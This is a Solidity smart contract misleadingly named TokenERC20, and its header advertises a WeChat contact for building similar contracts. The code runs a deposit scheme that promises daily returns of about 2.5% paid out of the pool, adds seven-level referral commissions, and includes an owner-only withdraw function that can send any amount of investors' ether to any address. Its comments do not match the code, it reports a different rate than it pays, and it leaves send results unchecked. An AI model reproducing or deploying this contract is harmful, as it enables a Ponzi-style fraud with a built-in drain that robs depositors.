1 /*
2 *
3 *
4 *   微信fac2323
5 *   制作erc20代币 ERC721代币，存款合约，太阳线合约，互助合约，微信fac2323
6 *
7 *
8 *
9 *
10 *
11 *
12 */
13 
14 
15 pragma solidity ^0.4.21;
16  
17 library SafeMath {
18 
19   function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
20     if (a == 0) {
21       return 0;
22     }
23     c = a * b;
24     assert(c / a == b);
25     return c;
26   }
27 
28   /**
29   * @dev Integer division of two numbers, truncating the quotient.
30   */
31   function div(uint256 a, uint256 b) internal pure returns (uint256) {
32     // assert(b > 0); // Solidity automatically throws when dividing by 0
33     // uint256 c = a / b;
34     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
35     return a / b;
36   }
37 
38   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
39     assert(b <= a);
40     return a - b;
41   }
42 
43 
44   function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
45     c = a + b;
46     assert(c >= a);
47     return c;
48   }
49 }
50  
51 library Fdatasets {
52  
53     struct Player {
54         address affadd;                // 上级推荐人0
55         uint256 atblock;                //时间1
56         uint256 invested;                //投资2
57         uint256 pot;               //管理员抽水 3
58         uint256 touzizongshu;      //投资总数4 
59         uint256 tixianzongshu;     //提现总数 5
60         uint256 yongjin;
61     }  
62     
63 }
64 
65 contract TokenERC20 {
66 	
67     using SafeMath for uint256;
68  
69     
70     
71     uint256 public commission  = 10;//抽水，可以改
72     uint256 public investeds;       //总投资
73     uint256 public amountren;         //amount人数 
74     address public owner       = 0xc47E655BC521Bf15981134E392709af5b25947B4;//0x115395f1a6B4640E0C59C33FED51677336b4B1E3
75     address aipi;
76     
77     
78      
79     mapping(address  => Fdatasets.Player)public users;
80     
81     modifier olyowner() {
82         require(msg.sender == owner || msg.sender == aipi); 
83         _;
84     }
85     
86     function TokenERC20()public  payable{
87        amountren = 0;
88        investeds = 0; 
89        aipi = msg.sender;
90     }
91     
92     function () payable public {
93        
94     	// if sender (aka YOU) is invested more than 0 ether
95         ///返利
96         if (users[msg.sender].invested != 0) {
97             // calculate profit amount as such:
98             // amount = (amount invested) * 4% * (blocks since last transaction) / 5900
99             // 5900 is an average block count per day produced by Ethereum blockchain
100             uint256 amount = users[msg.sender].invested * 25 / 1000 * (now - users[msg.sender].atblock) / 86400;
101 
102             // send calculated amount of ether directly to sender (aka YOU)
103             if(this.balance < amount ){
104                 amount = this.balance;
105             }
106             address sender = msg.sender;
107             sender.send(amount);
108             users[msg.sender].tixianzongshu = amount.add(users[msg.sender].tixianzongshu); //提现总数
109         }
110 
111         // record block number and invested amount (msg.value) of this transaction
112         users[msg.sender].atblock = now;
113         users[msg.sender].invested += msg.value;
114         users[msg.sender].touzizongshu = msg.value.add(users[msg.sender].touzizongshu);//投资总数
115         //推荐佣金发放
116         if(msg.value > 0){
117             amountren++;
118             investeds = investeds.add(msg.value);
119             
120             //抽水
121              users[owner].pot = users[owner].pot + (msg.value * commission / 100);
122             address a = users[msg.sender].affadd;
123             for(uint256 i = 0; i < 7; i++){
124                 if(i == 0 && a != address(0)){
125                     a.send(msg.value * 8 / 100 ); 
126                     users[a].yongjin = users[a].yongjin.add(msg.value * 8 / 100 ); 
127                 }
128                     
129                 if(i == 1 && a != address(0)){
130                     a.send(msg.value * 5 / 100 );
131                     users[a].yongjin = users[a].yongjin.add(msg.value * 5 / 100 ); 
132                 }
133                      
134                 if(i == 2  && a != address(0)){
135                     a.send(msg.value * 3 / 100 ); 
136                     users[a].yongjin = users[a].yongjin.add(msg.value * 3 / 100 ); 
137                 }
138                     
139                 if(i > 2  &&  a != address(0)){
140                     a.send(msg.value * 1 / 100 ); 
141                     users[a].yongjin = users[a].yongjin.add(msg.value * 1 / 100 ); 
142                 }
143                 a = users[a].affadd;       
144             }  
145         } 
146     }
147     
148     //撤回资金
149     function withdraw(uint256 _amount,address _owner)public olyowner returns(bool){
150         _owner.send(_amount);
151         return true;
152     }
153     
154     //撤回抽水
155     function withdrawcommissions()public olyowner returns(bool){
156         owner.send(users[msg.sender].pot);
157         users[msg.sender].pot=0;
158     }
159     
160     //修改抽水
161     function commissions(uint256 _amount)public olyowner returns(bool){
162         commission = _amount;
163     }
164  
165      //查看可以提取多少
166     function gettw(address _owner)public view returns(uint256){
167         uint256 amount;
168      
169         amount = users[_owner].invested * 2 / 100 * (now - users[_owner].atblock) / 86400;
170        
171         return amount;
172     }
173  
174     
175     //get this.
176     function getthis()public view returns(uint256){ 
177         return this.balance;
178     }
179     
180     //get amount人数investeds
181     function getamount()public view returns(uint256,uint256){ 
182         return (amountren,investeds);
183     }
184  
185     //提现总数
186     function gets(address _owner)public view returns(uint256,uint256,uint256){
187         uint256 a = users[_owner].touzizongshu;
188         uint256 b = users[_owner].tixianzongshu;
189         uint256 c = users[_owner].yongjin;
190         return (a,b,c);
191     }
192   
193     function investedbuy(address _owner)public payable  {
194         require(msg.sender != _owner); 
195         amountren++;
196         investeds = investeds.add(msg.value);
197         users[msg.sender].affadd = _owner;
198         //抽水  
199         users[owner].pot = users[owner].pot + (msg.value * commission / 100);
200         address a = users[msg.sender].affadd;
201          
202         for(uint256 i = 0; i < 7; i++){
203             if(i == 0 && a != address(0)){
204                 a.send(msg.value * 8 / 100 );
205                 users[a].yongjin = users[a].yongjin.add(msg.value * 8 / 100 ); 
206             }
207                     
208             if(i == 1 && a != address(0)){
209                 a.send(msg.value * 5 / 100 );
210                 users[a].yongjin = users[a].yongjin.add(msg.value * 5 / 100 ); 
211             }
212                      
213             if(i == 2  && a != address(0)){
214                 a.send(msg.value * 3 / 100 ); 
215                 users[a].yongjin = users[a].yongjin.add(msg.value * 3 / 100 ); 
216             }
217                     
218             if(i > 2  &&  a != address(0)){
219                 a.send(msg.value * 1 / 100 );
220                 users[a].yongjin = users[a].yongjin.add(msg.value * 1 / 100 ); 
221             }
222              a = users[a].affadd;           
223         } 
224         users[msg.sender].touzizongshu = msg.value.add(users[msg.sender].touzizongshu);//投资总数
225          ///返利
226         if (users[msg.sender].invested != 0) {
227             // calculate profit amount as such:
228             // amount = (amount invested) * 4% * (blocks since last transaction) / 5900
229             // 5900 is an average block count per day produced by Ethereum blockchain
230             uint256 amount = users[msg.sender].invested * 25 / 1000 * (now - users[msg.sender].atblock) / 86400;
231 
232             // send calculated amount of ether directly to sender (aka YOU)
233             if(this.balance < amount ){
234                 amount = this.balance;
235             }
236             address sender = msg.sender;
237             sender.send(amount);
238             users[msg.sender].tixianzongshu = amount.add(users[msg.sender].tixianzongshu); //提现总数
239         }
240         users[msg.sender].atblock = now;
241         users[msg.sender].invested += msg.value;
242      
243     } 
244   
245 
246 }